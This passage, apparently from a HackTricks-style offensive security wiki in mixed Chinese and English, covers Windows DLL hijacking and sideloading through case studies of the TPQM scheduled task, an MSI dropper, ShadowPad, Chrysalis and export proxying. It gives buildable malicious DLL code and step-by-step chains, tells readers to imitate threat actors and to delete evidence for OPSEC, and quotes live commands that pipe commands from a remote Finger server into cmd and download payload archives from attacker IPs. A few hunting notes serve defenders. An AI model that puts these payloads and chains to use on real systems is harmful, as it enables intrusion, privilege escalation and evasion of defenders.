// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. 作为标准用户，将 `hostfxr.dll` 放入 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待 scheduled task 在上午 9:30 以当前用户的上下文运行。
3. 如果 task 执行时有管理员登录，malicious DLL 会在管理员的 session 中以 medium integrity 运行。
4. 链接标准的 UAC bypass techniques，将权限从 medium integrity 提升至 SYSTEM privileges。

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors 经常将基于 MSI 的 droppers 与 DLL side-loading 结合，以便在受信任的 signed process 下执行 payload。<sup>[[10]](#references)</sup>

Chain overview
- 用户下载 MSI。GUI 安装期间，CustomAction 会静默运行（例如 LaunchApplication 或 VBScript action），从 embedded resources 中重构下一阶段。
- Dropper 将一个合法的 signed EXE 和一个 malicious DLL 写入同一目录（示例组合：Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 启动 signed EXE 时，Windows DLL search order 会优先从 working directory 加载 wsc.dll，从而在 signed parent 下执行 attacker code（ATT&CK T1574.001）。

MSI analysis（检查内容）
- CustomAction table：
- 查找运行 executables 或 VBScript 的 entries。可疑模式示例：LaunchApplication 在后台执行 embedded file。
- 在 Orca（Microsoft Orca.exe）中检查 CustomAction、InstallExecuteSequence 和 Binary tables。
- MSI CAB 中的 Embedded/split payloads：
- Administrative extract：msiexec /a package.msi /qb TARGETDIR=C:\out
- 或使用 lessmsi：lessmsi x package.msi C:\out
- 查找多个 small fragments，它们由 VBScript CustomAction 进行拼接和解密。常见流程：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
使用 wsc_proxy.exe 进行实际 sideloading

- 将以下两个文件放在同一文件夹中：
- wsc_proxy.exe：合法的已签名 host（Avast）。该进程会按名称从其目录加载 wsc.dll。
- wsc.dll：攻击者 DLL。如果不需要特定的 exports，DllMain 即可满足要求；否则，构建一个 proxy DLL，将所需的 exports 转发到真实库，同时在 DllMain 中运行 payload。
- 构建一个最小化的 DLL payload：
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 对于 export requirements，请使用 proxying framework（例如 DLLirant/Spartacus）生成一个 forwarding DLL，同时执行你的 payload。

- 此技术依赖 host binary 进行 DLL name resolution。如果 host 使用 absolute paths 或 safe loading flags（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），hijack 可能会失败。
- KnownDLLs、SxS 和 forwarded exports 会影响优先级，因此在选择 host binary 和 export set 时必须予以考虑。

## Signed triads + encrypted payloads（ShadowPad case study）

Check Point 描述了 Ink Dragon 如何使用 **three-file triad** 部署 ShadowPad：与合法软件混淆，同时让核心 payload 在磁盘上保持加密状态：<sup>[[12]](#references)</sup>

1. **Signed host EXE** – 滥用 AMD、Realtek 或 NVIDIA 等厂商的程序（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻击者将可执行文件重命名为类似 Windows binary 的名称（例如 `conhost.exe`），但 Authenticode signature 仍保持有效。
2. **Malicious loader DLL** – 使用预期名称放置在 EXE 旁边（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。该 DLL 通常是使用 ScatterBrain framework 混淆的 MFC binary；其唯一任务是定位 encrypted blob、解密它，并 reflectively map ShadowPad。
3. **Encrypted payload blob** – 通常以 `<name>.tmp` 的形式存储在同一目录中。对解密后的 payload 进行 memory-mapping 后，loader 会删除 TMP file 以销毁 forensic evidence。

Tradecraft notes：

* 重命名 signed EXE（同时保留 PE header 中原始的 `OriginalFileName`）可以让它伪装成 Windows binary，同时保留 vendor signature。因此，应复现 Ink Dragon 放置看似 `conhost.exe`、实则为 AMD/NVIDIA utilities 的 binary 的习惯。
* 由于 executable 仍然受信任，大多数 allowlisting controls 只需要让你的 malicious DLL 与其处于同一目录。重点应放在自定义 loader DLL 上；signed parent 通常可以原样运行。
* ShadowPad 的 decryptor 要求 TMP blob 位于 loader 旁边，并且可写，以便在 mapping 后将文件内容清零。在 payload 加载前保持目录可写；进入内存后，可以安全地删除 TMP file 以实现 OPSEC。

### LOLBAS stager + staged archive sideloading chain（finger → tar/curl → WMI）

Operators 将 DLL sideloading 与 LOLBAS 结合，使磁盘上唯一的 custom artifact 成为 trusted EXE 旁边的 malicious DLL：<sup>[[1]](#references)</sup>

- **Remote command loader（Finger）：** Hidden PowerShell 生成 `cmd.exe /c`，从 Finger server 获取 commands，并将其通过 pipe 传给 `cmd`：

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` 获取 TCP/79 text；`| cmd` 执行 server response，使 operators 可以在 server-side 轮换 second stage。

- **Built-in download/extract：** 使用 benign extension 下载 archive，解包，并在随机的 `%LocalAppData%` folder 下 stage sideload target 和 DLL：

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` 隐藏进度并跟随 redirects；`tar -xf` 使用 Windows 内置的 tar。

- **WMI/CIM launch：** 通过 WMI 启动 EXE，使 telemetry 显示一个由 CIM 创建的 process，同时加载 colocated DLL：

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- 适用于偏好 local DLLs 的 binaries（例如 `intelbq.exe`、`nearby_share.exe`）；payload（例如 Remcos）会在 trusted name 下运行。

- **Hunting：** 当 `forfiles` 中同时出现 `/p`、`/m` 和 `/c` 时触发 alert；这种组合在 admin scripts 之外并不常见。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload（Chrysalis）

近期一次 Lotus Blossom intrusion 滥用了 trusted update chain，投递一个 NSIS-packed dropper，该 dropper stage 了 DLL sideload 以及 fully in-memory payloads。<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe`（NSIS）创建 `%AppData%\Bluetooth`，将其标记为 **HIDDEN**，放置重命名后的 Bitdefender Submission Wizard `BluetoothService.exe`、malicious `log.dll` 和 encrypted blob `BluetoothService`，然后启动 EXE。
- Host EXE 导入 `log.dll` 并调用 `LogInit`/`LogWrite`。`LogInit` mmap-load blob；`LogWrite` 使用 custom LCG-based stream（常量 **0x19660D** / **0x3C6EF35F**，key material 源自之前的 hash）解密它，用 plaintext shellcode 覆盖 buffer，释放 temps，然后跳转到其中。
- 为避免 IAT，loader 通过使用 **FNV-1a basis 0x811C9DC5 + prime 0x100019** 对 export names 进行 hashing 来解析 APIs，然后应用 Murmur-style avalanche（**0x85EBCA6B**），并与 salted target hashes 进行比较。

Main shellcode（Chrysalis）
- 通过在五个 passes 中使用 key `gQ2JR&9;` 重复执行 add/XOR/sub，解密类似 PE 的 main module，然后动态加载 `Kernel32.dll` → `GetProcAddress`，完成 import resolution。
- 在 runtime 中通过逐字符的 bit-rotate/XOR transforms 重建 DLL name strings，然后加载 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`。
- 使用 second resolver 遍历 **PEB → InMemoryOrderModuleList**，以 4-byte blocks 解析每个 export table，并执行 Murmur-style mixing；只有在未找到 hash 时才回退到 `GetProcAddress`。

Embedded configuration & C2
- Config 位于 dropped `BluetoothService` file 的 **offset 0x30808**（size **0x980**）处，并使用 key `qwhvb^435h&*7` 进行 RC4-decrypted，揭示 C2 URL 和 User-Agent。
- Beacons 构建 dot-delimited host profile，添加 tag `4Q` 前缀，然后使用 key `vAuig34%^325hGV` 进行 RC4-encrypt，再通过 HTTPS 上的 `HttpSendRequestA` 发送。Responses 经 RC4-decrypted 后由 tag switch 分发（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）。
- Execution mode 由 CLI args 控制：无 args = install persistence（service/Run key）并指向 `-i`；`-i` 使用 `-k` relaunch self；`-k` 跳过 install 并运行 payload。

Alternate loader observed
- 同一次 intrusion 还投递了 Tiny C Compiler，并从 `C:\ProgramData\USOShared\` 执行 `svchost.exe -nostdlib -run conf.c`，其旁边放置 `libtcc.dll`。Attacker-supplied C source 嵌入 shellcode，经过编译后在内存中运行，未在磁盘上接触 PE。Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- 这一基于 TCC 的 compile-and-run 阶段在运行时导入了 `Wininet.dll`，并从硬编码 URL 获取第二阶段 shellcode，从而提供了一个伪装成 compiler run 的灵活 loader。

## 使用 export proxying + host thread parking 的 Signed-host sideloading

一些 DLL sideloading 链会加入**稳定性工程**，使合法 host 在加载后续阶段期间保持运行，避免恶意 DLL 加载后立即崩溃。<sup>[[11]](#references)</sup>

观察到的模式
- 将受信任的 EXE 与恶意 DLL 放在一起，并使用预期的依赖名称，例如 `version.dll`。
- 恶意 DLL 将**每个预期的 export 都 proxy** 回真实的系统 DLL（例如 `%SystemRoot%\\System32\\version.dll`），使 import resolution 继续成功，并让 host process 保持正常运行。
- 加载后，恶意 DLL 会**patch host entry point**，使主线程进入无限 `Sleep` 循环，而不是退出或执行会终止 process 的代码路径。
- 新线程执行真正的恶意操作：解密下一阶段 DLL 的名称或路径（RC4/XOR 很常见），然后使用 `LoadLibrary` 启动它。

为什么这很重要
- 普通的 DLL proxying 可以保持 API compatibility，但无法保证 host 会存活足够长的时间以供后续阶段运行。
- 将主线程停驻在 `Sleep(INFINITE)` 中，是在 loader 通过 worker thread 执行解密、staging 或 network bootstrap 时，让 signed process 保持 resident 的简单方法。
- 如果只针对可疑的 `DllMain` 进行 hunting，而有趣的行为发生在 host entry point 被 patch 且 secondary thread 启动之后，就可能漏掉此模式。

最小 workflow
1. 复制 signed host EXE，并确定它从 local directory 解析的 DLL。
2. 构建一个导出相同函数并将其 forwarding 到 legitimate DLL 的 proxy DLL。
3. 在 `DllMain(DLL_PROCESS_ATTACH)` 中创建 worker thread。
4. 从该线程 patch host entry point 或 main thread start routine，使其循环执行 `Sleep`。
5. 解密下一阶段 DLL 名称/config，并调用 `LoadLibrary` 或对 payload 执行 manual-map。

Defensive pivots
- Signed processes 从自身 application directory 而不是 `System32` 加载 `version.dll` 或类似的常见 libraries。
- 在 image load 后不久出现在 process entry point 处的 memory patches，尤其是重定向至 `Sleep`/`SleepEx` 的 jumps/calls。
- 由 proxy DLL 创建、并立即使用解密后的名称对第二个 DLL 调用 `LoadLibrary` 的 threads。
- 与 vendor executables 放置在一起的 full-export proxy DLL，尤其是在 `ProgramData`、`%TEMP%` 或已解包的 archive paths 等可写 staging directories 中。

## References

- [1] [Red Canary – Intelligence Insights：2026 年 1 月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - 使用 TPQMAssistant.exe 进行 Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT：DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows 中的 DLL hijacking。简单的 C 示例。](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore 部署针对欧洲的新 Malware](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility：当 DLL Hijacks 遇到 Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers：分发 Gh0st RAT 的不断演变的 Impersonation Campaigns 剖析](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests：针对东南亚政府的 Threat Clusters 分析](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon：揭示隐蔽 Offensive Operation 的 Relay Network 和内部运作机制](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor：深入解析 Lotus Blossom 的 toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens 的 2026 年 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious：Nimbus Manticore 在 Iranian Conflict 期间的 Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
